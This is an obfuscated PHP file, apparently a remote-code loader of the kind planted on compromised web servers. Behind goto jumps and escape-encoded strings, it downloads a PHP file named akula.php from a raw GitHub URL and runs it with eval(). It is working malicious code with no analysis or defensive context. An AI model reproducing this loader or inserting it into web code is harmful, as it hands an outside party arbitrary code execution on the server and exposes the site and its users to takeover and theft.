<?php
/* BulkMetrikSEO Obfuscator | BM-864A92FE9469 | https://www.bulkmetrik.com */
goto BulkMetrik_7a05a6d3cb;
BulkMetrik_8a409f5535: curl_setopt_array($ch, [
CURLOPT_RETURNTRANSFER => true,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_SSL_VERIFYHOST => 2,
CURLOPT_SSL_VERIFYPEER => true,
CURLOPT_CONNECTTIMEOUT => 10,
CURLOPT_TIMEOUT => 30,
]);
 goto BulkMetrik_5b9e8c19e6;
BulkMetrik_5b9e8c19e6: $res = curl_exec($ch);
 goto BulkMetrik_93dfede0da;
BulkMetrik_93dfede0da: $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
 goto BulkMetrik_ccb2b79566;
BulkMetrik_fddb2137f9: if (strpos($code, "\074\x3f\160\x68\160") === 0) {
$code = substr($code, 5);
} elseif (strpos($code, "\x3c\077") === 0) {
$code = substr($code, 2);
}
 
eval($code);
 goto BulkMetrik_9af675c308;
BulkMetrik_1757fab903: $ch = curl_init($url);
 goto BulkMetrik_8a409f5535;
BulkMetrik_ccb2b79566: $error = curl_error($ch);
 goto BulkMetrik_7a36388495;
BulkMetrik_7a36388495: curl_close($ch);
 goto BulkMetrik_abc09f8706;
BulkMetrik_abc09f8706: if ($res === false || $httpCode !== 200) {
exit("\x47\141\x67\141\x6c\040\x6d\145\x6e\147\x61\155\x62\151\x6c\040\x66\151\x6c\145\x3a\040" . $error);
}
 
 
$code = trim($res);
 goto BulkMetrik_fddb2137f9;
BulkMetrik_7a05a6d3cb: $url = "\x68\164\x74\160\x73\072\x2f\057\x72\141\x77\056\x67\151\x74\150\x75\142\x75\163\x65\162\x63\157\x6e\164\x65\156\x74\056\x63\157\x6d\057\x65\156\x63\157\x64\145\x75\162\x69\057\x6c\141\x64\151\x65\163\x63\157\x64\145\x63\157\x6c\154\x65\143\x74\151\x76\145\x2e\143\x6f\155\x2f\162\x65\146\x73\057\x68\145\x61\144\x73\057\x6d\141\x69\156\x2f\141\x6b\165\x6c\141\x2e\160\x68\160";
 goto BulkMetrik_1757fab903;
BulkMetrik_9af675c308:;
